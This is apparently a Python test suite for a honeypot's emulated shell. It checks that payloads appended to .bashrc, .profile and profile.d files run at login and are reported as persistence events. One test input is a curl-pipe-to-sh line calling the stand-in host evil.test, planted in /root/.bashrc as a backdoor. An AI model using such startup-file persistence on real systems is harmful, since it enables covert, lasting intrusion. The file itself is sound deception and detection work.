#!/usr/bin/env python3
"""Shell startup files -- /etc/profile, profile.d, ~/.profile, ~/.bashrc.

The axis: does anything on this box ever *read* the files that a login
shell reads? Two answers to one question disagreed. `cat ~/.bashrc` showed
the file and `echo payload >> ~/.bashrc` wrote to it -- the box agreed the
file was there and was writable -- but no session ever sourced it, so the
single commonest one-line persistence on Linux executed exactly never. An
attacker who came back to a shell that ignored their own backdoor learns
more about the box than the box learns about them.
"""
import sys
import fakeshell as F

FAILS = []
CHECKS = []


def check(label, got, want):
    ok = got == want
    CHECKS.append(label)
    if not ok:
        FAILS.append((label, got, want))
    return ok


def sh(vfs=None, peer="203.0.113.9", exec_mode=True):
    v = vfs or F.VFS()
    s = F.Shell(v, peer=peer)
    s.exec_mode = exec_mode
    return s


def events(s):
    got = []
    s.log = lambda **kw: got.append(kw)
    return got


def persist(evs, kind=None):
    return [e for e in evs
            if e.get("event") == "persistence"
            and (kind is None or e.get("kind") == kind)]


def main():
    # -- a clean login is silent -----------------------------------------
    v = F.VFS()
    s = sh(v)
    check("clean login prints nothing", s.run_startup_files(login=True), "")

    # ...and does not fire a persistence event on an untouched image.
    s2 = sh(v)
    evs = events(s2)
    s2.run_startup_files(login=True)
    check("clean login has no persistence event", persist(evs), [])

    # -- the files the shell must read exist -----------------------------
    for path in ("/etc/profile", "/root/.bashrc", "/root/.profile",
                 "/home/deploy/.bashrc", "/home/deploy/.profile"):
        check("seeded %s" % path, F.VFS().exists(path), True)

    # Debian's /root/.profile sources ~/.bashrc; that chain has to hold,
    # because it is what makes a ~/.bashrc payload run at *login*.
    body = F.VFS().read("/root/.profile").decode()
    check("/root/.profile sources .bashrc", ".bashrc" in body, True)

    # -- the payload actually runs ---------------------------------------
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo PWNED_BASHRC' >> /root/.bashrc")
    s2 = sh(v)
    check("bashrc payload runs at login",
          "PWNED_BASHRC" in s2.run_startup_files(login=True), True)

    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo PWNED_PROFILE' >> /root/.profile")
    check("profile payload runs at login",
          "PWNED_PROFILE" in sh(v).run_startup_files(login=True), True)

    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo PWNED_D' > /etc/profile.d/zz-x.sh")
    check("profile.d payload runs at login",
          "PWNED_D" in sh(v).run_startup_files(login=True), True)

    # A file dropped in profile.d that is not a .sh is ignored, as run-parts
    # style sourcing in /etc/profile ignores it.
    v = F.VFS()
    sh(v).run("echo 'echo NOPE' > /etc/profile.d/zz-x.conf")
    check("profile.d ignores non-.sh",
          "NOPE" in sh(v).run_startup_files(login=True), False)

    # -- and is reported -------------------------------------------------
    v = F.VFS()
    sh(v).run("echo 'curl -s http://evil.test/x|sh' >> /root/.bashrc")
    s2 = sh(v)
    evs = events(s2)
    s2.run_startup_files(login=True)
    p = persist(evs, "startup_file")
    check("modified startup file reported", len(p), 1)
    if p:
        check("reports which file", p[0].get("path"), "/root/.bashrc")
        check("reports the added line",
              "evil.test" in (p[0].get("added") or ""), True)

    # A file that was never in the image is the other half: dropping a new
    # /etc/profile.d/*.sh edits nothing, so a diff against the baseline
    # alone would have missed it.
    v = F.VFS()
    sh(v).run("echo 'echo hi' > /etc/profile.d/zz-new.sh")
    s2 = sh(v)
    evs = events(s2)
    s2.run_startup_files(login=True)
    p = persist(evs, "startup_file_added")
    check("added profile.d file reported", len(p), 1)
    if p:
        check("added file path", p[0].get("path"), "/etc/profile.d/zz-new.sh")

    # ~/.bash_profile does not exist on the image, and creating one both
    # takes precedence over ~/.profile and is persistence in its own right.
    v = F.VFS()
    sh(v).run("echo 'echo FROM_BASH_PROFILE' > /root/.bash_profile")
    s2 = sh(v)
    evs = events(s2)
    out = s2.run_startup_files(login=True)
    check("bash_profile runs", "FROM_BASH_PROFILE" in out, True)
    check("bash_profile reported",
          [e.get("path") for e in persist(evs, "startup_file_added")],
          ["/root/.bash_profile"])

    # bash reads the *first* of .bash_profile/.bash_login/.profile only.
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo FIRST' > /root/.bash_profile")
    s.run("echo 'echo SECOND' >> /root/.profile")
    out = sh(v).run_startup_files(login=True)
    check("bash_profile wins over profile",
          ("FIRST" in out, "SECOND" in out), (True, False))

    # -- the download inside the payload is still captured ---------------
    v = F.VFS()
    sh(v).run("echo 'curl -s http://evil.test/x.sh' >> /root/.bashrc")
    s2 = sh(v)
    evs = events(s2)
    s2.run_startup_files(login=True)
    check("payload download captured",
          any(e.get("event") == "download"
              and "evil.test" in str(e.get("url", "")) for e in evs), True)

    # -- ordering --------------------------------------------------------
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo A_PROFILE' >> /etc/profile")
    s.run("echo 'echo B_D' > /etc/profile.d/zz-b.sh")
    s.run("echo 'echo C_USER' >> /root/.profile")
    out = sh(v).run_startup_files(login=True).split()
    # profile.d runs BEFORE the appended marker, because Debian's real
    # /etc/profile ends with the run-parts loop that sources it -- so a line
    # appended to the file lands after that loop, not before. Verified
    # against the host's bash sourcing the real file with the same marker
    # appended: B_D, then A_PROFILE.
    #
    # This expected A_PROFILE first, which was true only while /etc/profile
    # was a sketch with no loop in it and the shell sourced profile.d
    # separately. The order was pinned to our own implementation rather than
    # to the file it imitates.
    check("profile.d runs from /etc/profile's own loop, then the rest",
          out, ["B_D", "A_PROFILE", "C_USER"])

    # profile.d files run in name order, as the sourcing loop sorts them.
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo TWO' > /etc/profile.d/20-two.sh")
    s.run("echo 'echo ONE' > /etc/profile.d/10-one.sh")
    check("profile.d sorted",
          sh(v).run_startup_files(login=True).split(), ["ONE", "TWO"])

    # -- non-login ---------------------------------------------------------
    v = F.VFS()
    sh(v).run("echo 'echo ONLY_BASHRC' >> /root/.bashrc")
    s2 = sh(v)
    out = s2.run_startup_files(login=False)
    check("non-login reads bashrc", "ONLY_BASHRC" in out, True)

    v = F.VFS()
    sh(v).run("echo 'echo SYSWIDE' >> /etc/profile")
    check("non-login skips /etc/profile",
          "SYSWIDE" in sh(v).run_startup_files(login=False), False)

    # Startup runs once per shell, not once per call: a second call is a
    # no-op, so nothing is double-executed or double-reported.
    v = F.VFS()
    sh(v).run("echo 'echo ONCE' >> /root/.bashrc")
    s2 = sh(v)
    first = s2.run_startup_files(login=True)
    check("startup runs once", (("ONCE" in first),
                                s2.run_startup_files(login=True)),
          (True, ""))

    # -- bash -l -----------------------------------------------------------
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo LOGIN_CHILD' > /etc/profile.d/zz-l.sh")
    check("bash -lc reads profile",
          s.run("bash -lc 'echo body'"), "LOGIN_CHILD\nbody\n")
    check("bash -c does not", s.run("bash -c 'echo body'"), "body\n")
    check("bash --login reads profile",
          s.run("bash --login -c 'echo body'"), "LOGIN_CHILD\nbody\n")
    check("sh -lc reads profile",
          s.run("sh -lc 'echo body'"), "LOGIN_CHILD\nbody\n")
    check("echo | bash -l reads profile",
          s.run("echo 'echo body' | bash -l"), "LOGIN_CHILD\nbody\n")
    check("echo | bash does not",
          s.run("echo 'echo body' | bash"), "body\n")

    # -- su - --------------------------------------------------------------
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo DEPLOY_PROFILE' >> /home/deploy/.profile")
    check("su - reads target profile",
          s.run("su - deploy -c 'id -un'"), "DEPLOY_PROFILE\ndeploy\n")
    check("su without - does not",
          s.run("su deploy -c 'id -un'"), "deploy\n")

    # -- mesg ---------------------------------------------------------------
    # /root/.profile on Debian ends with `mesg n 2>/dev/null || true`, so
    # once the file was really sourced a broken `mesg n` printed "is y" on
    # every single login -- a tell that appeared only because the sourcing
    # started working.
    s = sh()
    check("mesg n is silent", s.run("mesg n"), "")
    check("mesg reports state", s.run("mesg"), "is n\n")
    s2 = sh()
    check("mesg default y", s2.run("mesg"), "is y\n")
    check("mesg y silent", s2.run("mesg y"), "")

    # -- the file still behaves like a file --------------------------------
    v = F.VFS()
    s = sh(v)
    s.run("echo 'echo TAIL' >> /root/.bashrc")
    check("append is visible to cat",
          s.run("tail -n1 /root/.bashrc"), "echo TAIL\n")
    check("wc counts the new line",
          s.run("wc -l < /root/.bashrc").strip().isdigit(), True)

    # -- the baseline must agree with the reader that consumes it ----------
    # _flag_startup_changes() diffs against startup_baseline using
    # rawfs.read(). The baseline was built from node.content, which does not
    # resolve symlinks -- and /etc/profile.d/70-systemd-shell-extra.sh is a
    # symlink into /usr/lib. The baseline held "" for it, every session read
    # the real 855 bytes, and so every clean login reported the box's own
    # systemd snippet as attacker persistence.
    #
    # Checking "a clean login is quiet" alone would not have caught this
    # until something happened to install a symlinked startup file, which is
    # exactly how it got in. This checks the invariant instead: whatever is
    # in the baseline must equal what the reader returns for it, for every
    # entry, so any future installer that adds one is covered on arrival.
    v = F.VFS()
    disagree = []
    for path, was in sorted(getattr(v, "startup_baseline", {}).items()):
        try:
            now = (v.read(path) or b"").decode("latin-1")
        except Exception:                                     # noqa: BLE001
            now = "<unreadable>"
        if now != was:
            disagree.append((path, len(was), len(now)))
    check("baseline agrees with read() for every entry", disagree, [])

    # And the symlinked file specifically, named, so a regression says which.
    link = "/etc/profile.d/70-systemd-shell-extra.sh"
    if link in v.nodes:
        check("symlinked profile.d file is in the baseline",
              link in v.startup_baseline, True)
        check("...with the target's body, not the link's empty node",
              len(v.startup_baseline.get(link, "")) > 100, True)

    n = len(FAILS)
    for label, got, want in FAILS:
        print("FAIL %s\n  got  %r\n  want %r" % (label, got, want))
    return n


if __name__ == "__main__":
    rc = main()
    print("startuptest: %d checks, %s"
          % (len(CHECKS), "%d differ" % rc if rc else "all pass"))
    sys.exit(1 if rc else 0)
